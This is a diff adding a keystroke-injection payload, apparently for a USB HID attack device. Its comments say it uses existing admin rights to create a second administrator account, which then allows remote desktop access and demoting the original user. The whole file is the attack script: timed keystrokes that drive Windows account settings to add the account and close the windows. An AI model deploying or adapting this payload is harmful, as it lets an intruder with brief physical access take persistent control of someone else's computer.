@@ -1,0 +1,71 @@
+REM This payload uses current admin privelages to create a new user with admin privelages on the same account
+REM when deployed this leaves potential to remote desktop and demote original user to standard and gain access 
+REM Author:FLYNN
+ATTACKMODE HID STORAGE 
+Q DELAY 5000
+Q INJECT_MOD
+Q WINDOWS 
+Q DELAY 500
+Q STRING settings 
+Q DELAY 100
+Q ENTER 
+Q DELAY 3000
+Q STRING accounts
+Q DELAY 500
+Q ENTER 
+Q DELAY 500
+Q TAB 
+Q DELAY 500
+Q DOWNARROW
+Q DELAY 500
+Q ENTER 
+Q DELAY 500
+Q TAB
+Q DELAY 300
+Q TAB
+Q DELAY 300
+Q TAB
+Q DELAY 300
+Q TAB
+Q DELAY 500
+Q ENTER 
+Q DELAY 8000
+Q STRING exampleemail
+Q DELAY 500
+Q STRING '"'
+Q DELAY 500
+Q STRING example.com
+Q DELAY 8000
+Q ENTER 
+Q DELAY 1000
+Q ENTER 
+Q DELAY 1000
+Q TAB 
+Q DELAY 800
+Q ENTER 
+Q DELAY 1000
+Q TAB 
+Q DELAY 1000
+Q ENTER
+Q DELAY 700
+Q TAB 
+Q DELAY 700
+Q TAB 
+Q DELAY 700
+Q TAB 
+Q DELAY 700
+Q ENTER 
+Q DELAY 500
+Q UPARROW
+Q DELAY 600
+Q ENTER 
+Q DELAY 500
+Q TAB 
+Q DELAY 700
+Q ENTER 
+Q DELAY 500
+Q ALT F4 
+Q DELAY 500
+Q ALT F4 
+
+
